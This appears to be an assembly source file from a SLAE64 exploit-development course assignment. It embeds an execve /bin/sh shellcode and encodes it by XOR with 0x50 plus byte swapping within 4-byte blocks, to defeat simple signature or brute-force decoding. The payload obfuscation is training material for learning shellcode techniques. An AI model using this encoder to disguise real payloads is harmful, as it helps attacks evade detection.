excerpt: asm code for my encoder

this assignment has been splitted in 2 exercises:

## ENCODER
    ; author     : Sandro "guly" Zaccarini SLAE64-1497
    ; purpose    : this program takes shellcode from 04-execve-stack.asm and swap bytes odd
    ;              with the next odd, even with next even, skipping already swapped ones
    ;              given ABCDEFGH, resulting shellcode will be: CDABGHEF
    ;              from a high point of view, i'm working with block of 4 bytes
    ;              plus, every byte is xored with an hardcoded value to prevent basic
    ;              "cyberchef" bruteforce
    ;              this code has been written for SLAE64 assignment 4
    ;              you can find all the code at https://github.com/gulyslae/SLAE64
    ; license    : CC-BY-NC-SA
    ;
    ; r14 => used for the first move
    ; r15 => pointer to SC starting address
    ; rcx => main counter
    ; rbx => counter used for the 4bytes swapping
    
      global _start

      SC: db 0x48,0x31,0xc0,0x50,0x48,0xbb,0x2f,0x62,0x69,0x6e,0x2f,0x2f,0x73,0x68,0x53,0x48,0x89,0xe7,0x50,0x48,0x89,0xe2,0x57,0x48,0x89,0xe6,0x48,0x83,0xc0,0x3b,0x0f,0x05
    
    ; i'm using this function to debug like "printf". i know initial values, and i calculated
    ; with pen and paper what i expect: piping this code to xxd is a very fast way to proof
    ; it could be easily skipped
      writeexit:
    ; don't care about previous env, junk it and print my 0x20 chars
    pop rax
    xor rax,rax
    xor rdi,rdi
    inc rdi      ; print to STDOUT of course
    mov rsi,rsp
    mov al,0x1   ; write syscall id
    mov rdx,rax
    mov dl,0x20  ; hardcoded len, i know it's 32chars => 0x20
    syscall
    xor rax,rax
    mov rdi,rax
    mov al,0x3C  ; and a neat exit, because when i print i don't want to exec
    syscall
    
    ; testodd and odd are explained on line ~92
      testodd:
    test bx,1 ; if odd. null here but as will state later, don't care
    jz odd
    ret
      odd:
    inc rbx
    inc rbx
    ret
    
      _start:
    ; make room for the shellcode, i know that the stack is rwx but memory where i have SC
    ; is r-x, so i will have sefgault if i try to write there. on modern system of course
    ; this won't work because of NX
    sub rsp,0x28
    
    ; move SC starting point to r15
    lea r15,[rel SC]
    
    ; counter to copy the whole shellcode to stack
    xor rcx,rcx
    push rcx
    pop r14
    push rcx
    pop rbx
    
    ; given i handle bytes in couple, i have to loop for half the length
    add cx,0x10
      copy:
    ; mov is heavy in term of bytes, but we don't need this shellcode to be small
    ; take rbx-th byte
    mov byte r14b,[r15+rbx]
    ; xor it
    xor r14b,0x50 ; i'd like to start with a nop, so i should xor with 0x50
                  ; unfortunately, i already have a 0x50 byte in my shellcode so it will lead
                  ; to nullbytes. doesn't matter, because i'm running this on MY box
    inc rbx
    inc rbx
    ; and swap it as discussed on top
    mov byte [rsp+rbx],r14b
    
    ; do the same with the counterpart
    mov byte r14b,[r15+rbx]
    xor r14b,0x50
    dec rbx
    dec rbx
    mov byte [rsp+rbx],r14b
    inc rbx
    
    ; i know that if rbx is odd, i already encoded a 4bytes block: i have to move to the
    ; next block by incrementing rbx by 2
    call testodd
    ; loop until rcx is 0, that means i worked on all shellcode
    loop copy
    
    ; actually i can't jmp rsp, so better write the shellcode to STDOUT :)
    call writeexit
